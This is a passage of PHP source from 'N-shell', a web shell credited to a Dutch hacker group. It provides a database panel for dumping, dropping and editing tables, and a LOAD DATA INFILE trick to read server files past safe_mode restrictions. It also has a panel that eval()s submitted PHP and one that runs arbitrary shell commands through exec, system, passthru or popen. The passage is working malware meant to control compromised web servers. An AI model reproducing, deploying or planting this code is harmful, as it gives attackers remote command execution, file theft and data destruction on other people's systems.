							echo "&nbsp;<a href='".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."'>".htmlspecialchars($row[0])."</a> (".$count_row[0].")</br>";
							mysql_free_result($count);
							$c++;
						}
						if (!$c) {
							echo "<font color='red'>Geen tabellen gevonden.</font>";
						}
					}
				} else {
					echo '<td width="155" height="100" valign="top">';
					$result = mysql_list_dbs($sql_sock);
					if (!$result) {
						echo mysql_smarterror();
					} else {
						echo '<form action="' . $pmaurl_final . '" method="POST"><input type="hidden" name="sql_login" value="' . htmlspecialchars($sql_login) . '"><input type="hidden" name="sql_passwd" value="' . htmlspecialchars($sql_passwd) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sql_server) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sql_port) . '"><select name="sql_db" style="width:140px;">';
						$c = 0;
						$dbs = "";
						while ($row = mysql_fetch_row($result)) {
							$dbs .= "<option value='".$row[0]."'";
							if ($sql_db == $row[0]) {
								$dbs .= " selected";
							} 
							$dbs .= ">".$row[0]."</option>";
							$c++;
						}
						echo "<option value=''>Databases (".$c.")</option>";
						echo $dbs;
					}
					echo '</select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form>';
				}
				echo "</tr></table></div></td>";
				//End left panel
				echo "</td><td width='100%' height='1' valign='top'>";
				echo '<div style=" width:600px; height:480px; overflow:auto;">';
				//Start center panel
				$diplay = TRUE;
				if ($sql_db) {
					if (!is_numeric($c)) {
						$c = 0;
					}
					if ($c == 0) {
						$c = "no";
					}
					echo "<font color='red'>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").</font><br />";
					if (count($dbquicklaunch) > 0) {
						foreach($dbsqlquicklaunch as $item) {
							echo "[ <a href='".$item[1]."'>".$item[0]."</a> ] ";
						}
					}
					echo "</b></center>";
					$acts = array("","dump");
					if ($sql_act == "tbldrop") {
						$sql_query = "DROP TABLE";
						foreach($boxtbl as $v) {
							$sql_query .= "\n`".$v."` ,";
						}
						$sql_query = substr($sql_query,0,-1).";";
						$sql_act = "query";
					} elseif ($sql_act == "tblempty") {
						$sql_query = "";
						foreach($boxtbl as $v) {
							$sql_query .= "DELETE FROM `".$v."` \n";
						}
						$sql_act = "query";
					} elseif ($sql_act == "tbldump") {
						if (count($boxtbl) > 0) {
							$dmptbls = $boxtbl;
						} elseif($thistbl) {
							$dmptbls = array($sql_tbl);
						}
						$sql_act = "dump";
					} elseif ($sql_act == "deleterow") {
						$sql_query = "";
						if (!empty($boxrow_all)) {
							$sql_query = "DELETE * FROM `".$sql_tbl."`;";
						} else {
							foreach($boxrow as $v) {
								$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";
							}
							$sql_query = substr($sql_query,0,-1);
						}
						$sql_act = "query";
					} elseif ($sql_tbl_act == "insert") {
						if ($sql_tbl_insert_radio == 1) {
							$keys = "";
							$akeys = array_keys($sql_tbl_insert);
							foreach ($akeys as $v) {
								$keys .= "`".addslashes($v)."`, ";
							} 
							if (!empty($keys)) {
								$keys = substr($keys,0,strlen($keys)-2);
							}
							$values = "";
							$i = 0;
							foreach (array_values($sql_tbl_insert) as $v) {
								if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {
									$values .= $funct." (";
								}
								$values .= "'".addslashes($v)."'";
								if ($funct) {
									$values .= ")";
								}
								$values .= ", "; $i++;
							}
							if (!empty($values)) {
								$values = substr($values,0,strlen($values)-2);
							}
							$sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
							$sql_act = "query";
							$sql_tbl_act = "browse";
						} elseif ($sql_tbl_insert_radio == 2) {
							$set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
							$sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
							$result = mysql_query($sql_query) or print(mysql_smarterror());
							$result = mysql_fetch_array($result, MYSQL_ASSOC);
							$sql_act = "query";
							$sql_tbl_act = "browse";
						}
					}
					if ($sql_act == "query") {
						echo "";
						if (($submit) and (!$sql_query_result) and ($sql_confirm)) {
							if (!$sql_query_error) {
								$sql_query_error = "Query was empty";
							}
							echo "<b>Error:</b> <br />".$sql_query_error."<br />";
						}
						if ($sql_query_result or (!$sql_confirm)) {
							$sql_act = $sql_goto;
						}
						if ((!$submit) or ($sql_act)) {
							echo "<table border='0' width='100%' height='1'><tr><td><form action='".$sql_surl."' method='POST'><b>";
							if (($sql_query) and (!$submit)) {
								echo "Do you really want to:";
							} else {
								echo "SQL-Query :";
							}
							echo "</b><br /><br /><textarea name='sql_query' cols='80' rows='10'>".htmlspecialchars($sql_query)."</textarea><br /><br /><input type='hidden' name='sql_act' value='query'><input type='hidden' name='sql_tbl' value='".htmlspecialchars($sql_tbl)."'><input type='hidden' name='submit' value='1'><input type='hidden' name='sql_goto' value='".htmlspecialchars($sql_goto)."'><input type='submit' name='sql_confirm' value='Yes'>&nbsp;<input type='submit' value='No'></form></td></tr></table>";
						}
					}
					if (in_array($sql_act,$acts)) {
						echo '<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Dump DB:</b><form action="' . $pmaurl_final . '" method="POST"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="' . htmlspecialchars($sql_db) . '"><input type="hidden" name="sql_login" value="' . htmlspecialchars($sql_login) . '"><input type="hidden" name="sql_passwd" value="' .
						 htmlspecialchars($sql_passwd) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sql_server) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sql_port) . '"><input type="text" name="dump_file" size="30" value="';
						echo "dump_".$sql_db.".sql";
						echo '">&nbsp;<input type="submit" name="submit" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table>';
						if (!empty($sql_act)) {
							echo "";
						}
						if ($sql_act == "newtbl") {
							echo "<b>";
							if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
								echo "DB '".htmlspecialchars($sql_newdb)."' has been created with success!</b><br />";
							} else {
								echo "Can't create DB '".htmlspecialchars($sql_newdb)."'.<br />Reason:</b> ".mysql_smarterror();
							}
						} elseif ($sql_act == "dump") {
							if (empty($submit)) {
								$diplay = FALSE;
								echo "<form method='GET'><input type='hidden' name='x' value='pma'><input type='hidden' name='sql_act' value='dump'><input type='hidden' name='sql_db' value='".htmlspecialchars($sql_db)."'><input type='hidden' name='sql_login' value='".htmlspecialchars($sql_login)."'><input type='hidden' name='sql_passwd' value='".htmlspecialchars($sql_passwd)."'><input type='hidden' name='sql_server' value='".htmlspecialchars($sql_server)."'><input type='hidden' name='sql_port' value='".htmlspecialchars($sql_port)."'><input type='hidden' name='sql_tbl' value='".htmlspecialchars($sql_tbl)."'><b>SQL-Dump:</b><br /><br />";
								echo "<b>DB:</b>&nbsp;<input type='text' name='sql_db' value='".urlencode($sql_db)."'><br /><br />";
								$v = join (";",$dmptbls);
								echo "<b>Only tables (explode ';')&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type='text' name='dmptbls' value='".htmlspecialchars($v)."' size='".(strlen($v)+5)."'><br /><br />";
								if ($dump_file) {
									$tmp = $dump_file;
								} else {
									$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");
								}
								echo "<b>File:</b>&nbsp;<input type='text' name='sql_dump_file' value='".$tmp."' size='".(strlen($tmp)+strlen($tmp) % 30)."'><br /><br />";
								echo "<b>Download: </b>&nbsp;<input type='checkbox' name='sql_dump_download' value='1' checked><br /><br />";
								echo "<b>Save to file: </b>&nbsp;<input type='checkbox' name='sql_dump_savetofile' value='1' checked>";
								echo "<br /><br /><input type='submit' name='submit' value='Dump'><br /><br /><b><sup>1</sup></b> - all, if empty";
								echo "</form>";
							} else {
								$diplay = TRUE;
								$set = array();
								$set["sock"] = $sql_sock;
								$set["db"] = $sql_db;
								$dump_out = "download";
								$set["echo"] = 0;
								$set["nl2br"] = 0;
								$set[""] = 0;
								$set["file"] = $dump_file;
								$set["add_drop"] = TRUE;
								$set["onlytabs"] = array();
								if (!empty($dmptbls)) {
									$set["onlytabs"] = explode(";",$dmptbls);
								}
								$ret = mysql_dump($set);
								if ($sql_dump_savetofile) {
									$fp = fopen($sql_dump_file,"w");
									if (!$fp) {
										echo "<b>Dump error! Can't write to '".htmlspecialchars($sql_dump_file)."'!";
									} else {
										fwrite($fp,$ret);
										fclose($fp);
										echo "<b>Dumped! Dump has been writed to '".htmlspecialchars(realpath($sql_dump_file))."'</b>.";
									}
								} else {
									echo "<b><font color='green'>Dumped! Dump has been writed to '".htmlspecialchars(realpath($sql_dump_file))."'</font></b>.";
								}
							}
						}
						if ($diplay) {
							if (!empty($sql_tbl)) {
								if (empty($sql_tbl_act)) {
									$sql_tbl_act = "browse";
								}
								$count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
								$count_row = mysql_fetch_array($count);
								mysql_free_result($count);
								$tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
								$tbl_struct_fields = array();
								while ($row = mysql_fetch_assoc($tbl_struct_result)) {
									$tbl_struct_fields[] = $row;
								}
								if ($sql_ls > $sql_le) {
									$sql_le = $sql_ls + $perpage;
								}
								if (empty($sql_tbl_page)) {
									$sql_tbl_page = 0;
								}
								if (empty($sql_tbl_ls)) {
									$sql_tbl_ls = 0;
								}
								if (empty($sql_tbl_le)) {
									$sql_tbl_le = 30;
								}
								$perpage = $sql_tbl_le - $sql_tbl_ls;
								if (!is_numeric($perpage)) {
									$perpage = 10;
								}
								$numpages = $count_row[0]/$perpage;
								$e = explode(" ",$sql_order);
								if (count($e) == 2) {
									if ($e[0] == "d") {
										$asc_desc = "DESC";
									} else {
										$asc_desc = "ASC";
									}
									$v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
								} else {
									$v = "";
								}
								$query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
								$result = mysql_query($query) or print(mysql_smarterror());
								echo "<center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
								echo "<a href='".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse'>[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
								echo "<a href='".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert'>[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
								if ($sql_tbl_act == "structure") {
									echo "<br /><br /><b>Coming sooon!</b>";
								}
								if ($sql_tbl_act == "insert") {
									if (!is_array($sql_tbl_insert)) {
										$sql_tbl_insert = array();
									}
									if (!empty($sql_tbl_insert_radio)) {
									} else {
										echo "<br /><br /><b>Inserting row into table:</b><br />";
										if (!empty($sql_tbl_insert_q)) {
											$sql_query = "SELECT * FROM `".$sql_tbl."`";
											$sql_query .= " WHERE".$sql_tbl_insert_q;
											$sql_query .= " LIMIT 1;";
											$result = mysql_query($sql_query,$sql_sock) or print("<br /><br />".mysql_smarterror());
											$values = mysql_fetch_assoc($result);
											mysql_free_result($result);
										} else {
											$values = array();
										}
										echo "<form method='POST'><table border='1' width='100%' cellspacing='0' cellpadding='0'><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
										foreach ($tbl_struct_fields as $field) {
											$name = $field["Field"];
											if (empty($sql_tbl_insert_q)) {
												$v = "";
											}
											echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name='sql_tbl_insert_functs[".htmlspecialchars($name)."]'><option value=''></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=''>--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type='text' name='sql_tbl_insert[".htmlspecialchars($name)."]' value='".htmlspecialchars($values[$name])."' size=50></td></tr>";
											$i++;
										}
										echo "</table><br />";
										echo "<input type='radio' name='sql_tbl_insert_radio' value='1'";
										if (empty($sql_tbl_insert_q)) {
											echo " checked";
										}
										echo "><b>Insert as new row</b>";
										if (!empty($sql_tbl_insert_q)) {
											echo " or <input type='radio' name='sql_tbl_insert_radio' value='2' checked><b>Save</b>";
											echo "<input type='hidden' name='sql_tbl_insert_q' value='".htmlspecialchars($sql_tbl_insert_q)."'>";
										}
										echo "<br /><br /><input type='submit' value='Confirm'></form>";
									}
								}
								if ($sql_tbl_act == "browse") {
									$sql_tbl_ls = abs($sql_tbl_ls);
									$sql_tbl_le = abs($sql_tbl_le);
									echo "";
									$b = 0;
									for($i=0;$i<$numpages;$i++) {
										if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {
											echo "<a href='".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."'><u>";
										}
										echo $i;
										if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {
											echo "</u></a>";
										}
										if (($i/30 == round($i/30)) and ($i > 0)) {
											echo "<br />";
										} else {
											echo "&nbsp;";
										}
									}
									if ($i == 0) {
										echo "empty";
									}
									echo "<form action='" . $pmaurl_final . "' method='POST'><input type='hidden' name='sql_db' value='".htmlspecialchars($sql_db)."'><input type='hidden' name='sql_login' value='".htmlspecialchars($sql_login)."'><input type='hidden' name='sql_passwd' value='".htmlspecialchars($sql_passwd)."'><input type='hidden' name='sql_server' value='".htmlspecialchars($sql_server)."'><input type='hidden' name='sql_port' value='".htmlspecialchars($sql_port)."'><input type='hidden' name='sql_tbl' value='".htmlspecialchars($sql_tbl)."'><input type='hidden' name='sql_order' value='".htmlspecialchars($sql_order)."'><b>From:</b>&nbsp;<input type='text' name='sql_tbl_ls' value='".$sql_tbl_ls."'>&nbsp;<b>To:</b>&nbsp;<input type='text' name='sql_tbl_le' value='".$sql_tbl_le."'>&nbsp;<input type='submit' value='View'></form>";
									echo "<br /><form method='POST'><TABLE cellSpacing=0 cellPadding=5 width='1%' border=1>";
									echo "<tr>";
									for ($i=0;$i<mysql_num_fields($result);$i++) {
										$v = mysql_field_name($result,$i);
										if ($e[0] == "a") {
											$s = "d"; $m = "asc";
										} else {
											$s = "a"; $m = "desc";
										}
										echo "<td>";
										if (empty($e[0])) {
											$e[0] = "a";
										}
										if ($e[1] != $v) {
											echo "<a href='".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."'><b>".$v."</b></a>";
										} else {
											echo "<b>".$v."</b><a href='".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."'></a>";
										}
										echo "</td>";
									}
									echo "<td><font color='green'><b>Action</b></font></td>";
									echo "</tr>";
									while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
										echo "<tr>";
										$w = "";
										$i = 0;
										foreach ($row as $k=>$v) {
											$name = mysql_field_name($result,$i);
											$w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;
										}
										if (count($row) > 0) {
											$w = substr($w,0,strlen($w)-3);
										}
										$i = 0;
										foreach ($row as $k=>$v) {
											$v = htmlspecialchars($v);
											if ($v == "") {
												$v = "<font color='green'>NULL</font>";
											}
											echo "<td>".$v."</td>";
											$i++;
										}
										echo "<td>";
										echo "<a href='".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."'>Delete</a>&nbsp;";
										echo "<a href='".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."'>Edit</a>&nbsp;";
										echo "</td>";
										echo "</tr>";
									}
									mysql_free_result($result);
									echo "</table><p align='left'></form></p>";
								}
							} else {
								$result = mysql_query("SHOW TABLE STATUS", $sql_sock);
								if (!$result) {
									echo mysql_smarterror();
								} else {
									echo "<br /><form method='POST'><TABLE cellSpacing=0 cellPadding=5 width='100%' border=1><tr><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Action</b></td></tr>";
									$i = 0;
									$tsize = $trows = 0;
									while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
										$tsize += $row["Data_length"];
										$trows += $row["Rows"];
										$size = view_size($row["Data_length"]);
										echo "<tr>";
										echo "<td>&nbsp;<a href='".$sql_surl."sql_tbl=".urlencode($row["Name"])."'><b>".$row["Name"]."</b></a>&nbsp;</td>";
										echo "<td>".$row["Rows"]."</td>";
										echo "<td>&nbsp;<a href='".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."'>Empty</a>&nbsp;&nbsp;<a href='".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."'>Drop</a>&nbsp;<a href='".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."'>Insert</a>&nbsp;</td>";
										echo "</tr>";
										$i++;
									}
									echo "<tr>";
									echo "<td><center><b></b></center></td>";
									echo "<td><center><b>".$i." table(s)</b></center></td>";
									echo "<td><b>".$trows."</b></td>";
									echo "<td>".$row[1]."</td>";
									echo "<td>".$row[10]."</td>";
									echo "<td>".$row[11]."</td>";
									echo "<td><b>".view_size($tsize)."</b></td>";
									echo "<td></td>";
									echo "</tr>";
									echo "</table><p align='right'></form></p>";
									mysql_free_result($result);
								}
							}
						}
					}
				} else {
					$acts = array("");
					if (in_array($sql_act,$acts)) {
						echo "Welkom op de phpmyadmin-clone van n0tiz (n-shell).<br /><br /><br /><br /><br />
						<div align='center' width='100%' style='background:#FFFFFF;'><img src='http://img526.imageshack.us/img526/2811/logorightow7.png'></div>";
					}
					if (!empty($_GET['sql_act'])) {
						if ($_GET['sql_act'] == "newdb") {
							echo "<b>";
							if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
								echo "DB '".htmlspecialchars($sql_newdb)."' has been created with success!</b><br />";
							} else {
								echo "Can't create DB '".htmlspecialchars($sql_newdb)."'.<br />Reason:</b> ".mysql_smarterror();
							}
						}
						// serverstatus
						if ($_GET['sql_act'] == "serverstatus"){
							$result = mysql_query("SHOW STATUS", $sql_sock);
							echo "<center><b>Server-status variables:</b><br />";
							echo "<TABLE cellspacing='0' cellpadding='0' width='100%'><td width='50%'><b>Name</b></td><td><b>Value</b></td></tr>";
							while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
								echo "<tr><td width='50%'>".$row[0]."</td><td>".$row[1]."</td></tr>";
							}
							echo "</table></center>";
							mysql_free_result($result);
						}
						// servervariabelen
						if ($_GET['sql_act'] == "servervars") {
							$result = mysql_query("SHOW VARIABLES", $sql_sock);
							echo "<center><b>Server variables:</b><br />";
							echo "<table cellspacing='0' cellpadding='0' width='100%'><td width='50%'><b>Name</b></td><td><b>Value</b></td></tr>";
							while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
								echo "<tr><td width='50%'>".$row[0]."</td><td>".$row[1]."</td></tr>";
							}
							echo "</table></center>";
							mysql_free_result($result);
						}
						if ($_GET['sql_act'] == "getfile") {
							$tmpdb = $sql_login."_tmpdb";
							$select = mysql_select_db($tmpdb);
							if (!$select) {
								mysql_create_db($tmpdb);
								$select = mysql_select_db($tmpdb);
								$created = !!$select;
							}
							if ($select) {
								$created = FALSE;
								mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
								mysql_query("LOAD DATA INFILE '".addslashes($sql_getfile)."' INTO TABLE tmp_file");
								$result = mysql_query("SELECT * FROM tmp_file;");
								if (!$result) {
									echo "<b>Error in reading file (permision denied)!</b>";
								} else {
									for ($i=0;$i<mysql_num_fields($result);$i++) {
										$name = mysql_field_name($result,$i);
									}
									$f = "";
									while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
										$f .= join ("\r\n",$row);
									}
									if (empty($f)) {
										echo "<b>File '".$sql_getfile."' does not exists or empty!</b><br />";
									} else {
										echo "<b>File '".$sql_getfile."':</b><br />".nl2br(htmlspecialchars($f))."<br />";
									}
									mysql_free_result($result);
									mysql_query("DROP TABLE tmp_file;");
								}
							}
							mysql_drop_db($tmpdb); //comment it if you want to leave database
						}
					}
				}
			}
			echo "</div>";
			echo "</td></tr></table>";
			echo "</table>";
			echo "</div>";
		} else if ($_GET['x_pwned'] == 'exec') { // php executer
			echo "<div align='center'";
			if (isset($_POST['exec'])) {
				echo "<div align='left' style='margin-left:5px;margin-right:5px;'>";
				eval(stripslashes($_POST['php']));
				echo "</div>";
			}
			echo "<form method='POST' action='" . $_PHP['SELF'] . "'>";
			echo '<textarea name="php" rows="15" cols="80">';
			echo stripslashes($_POST['php']);
			echo '</textarea><br />';
			echo "<input type='submit' value='Execute !' name='exec'>";
			echo "</form>";
			echo "</div>";
		} else if ($_GET['x_pwned'] == "cmd") {
			echo "<div align='center' width='100%'>";
			$cmd = $_POST['cmd'];
			function myshellexec($cmd) {
				global $disablefunc;
				$result = "";
				if (!empty($cmd)) {
					if (is_callable("exec")) {
						exec($cmd,$result);
						$result = join("\n",$result);
					} else if (($result = $cmd) !== FALSE) {
					} else if (is_callable("system")) {
						$v = @ob_get_contents();
						@ob_clean();
						system($cmd);
						$result = @ob_get_contents();
						@ob_clean();
						echo $v;
					} else if (is_callable("passthru")) {
						$v = @ob_get_contents();
						@ob_clean();
						passthru($cmd);
						$result = @ob_get_contents();
						@ob_clean();
						echo $v;
					} else if (is_resource($fp = popen($cmd,"r"))) {
						$result = "";
						while(!feof($fp)) {
							$result .= fread($fp,1024);
						}
						pclose($fp);
					}
				}
				return $result;
			}
			
			@chdir($chdir);
			if (isset($_POST['submit'])) {
				echo "<b>Result of execution this command</b>:";
				$olddir = realpath(".");
				@chdir($d);
				$ret = myshellexec($cmd);
				$ret = convert_cyr_string($ret,"d","w");
				if ($cmd_txt) {
					$rows = count(explode("\r\n",$ret))+1;
					if ($rows < 10) {$rows = 10;}
					echo "<br/><textarea cols='80' rows='20' readonly>".htmlspecialchars($ret)."</textarea><br/>";
				} else {
					echo "<br/><textarea cols='80' rows='20' readonly>".htmlspecialchars($ret)."</textarea><br/>";
				}
				@chdir($olddir);
			} else {
				echo "<b>Result of execution this command</b>";
				echo "<br/><textarea cols='80' rows='20' readonly>".htmlspecialchars($ret)."</textarea><br/>";
				if (empty($cmd_txt)) {
					$cmd_txt = TRUE;
				}
			}
			echo "<form method='POST'><input type='text' size='95' name=cmd value='".htmlspecialchars($_POST['cmd'])."'> <input type='submit' name='submit' value='Execute'></form>";
			echo "</div>";
		} else if (!isset($_GET['x_pwned']) OR $_GET['x_pwned'] == 'home' OR !$_GET['x_pwned']){
			echo "Welcome on N-shell, the second dutch shell.<br /><br />Made by n0tiz and FiLEFUSiON.<br /><br /><br />Shouting @ DaiMoNtoR, Flux, Fox, Inspiratio, Rienkrules, Killing-Devil, and all the others...<br/><br/><br/><div align='center' width='100%' style='background:#2A2A2A; color:#000000;font-weight:bold;'>Signed for Rienkrules, FiLEFUSiON, kapiteinkoek, Inspiratio and DaiMoNtoR :<br /><img src='http://img150.imageshack.us/img150/9158/n0tizhandtekeiningad4.jpg'></div>";
		}
	echo "</td></tr><tr><td class='copyrightpwned' colspan='3' valign='top'>&copy; copyright 2007-2008 n0tiz.be and hackers-project.info</td></tr></table></div>";
	echo "</body></html>";
}
exit();
?>


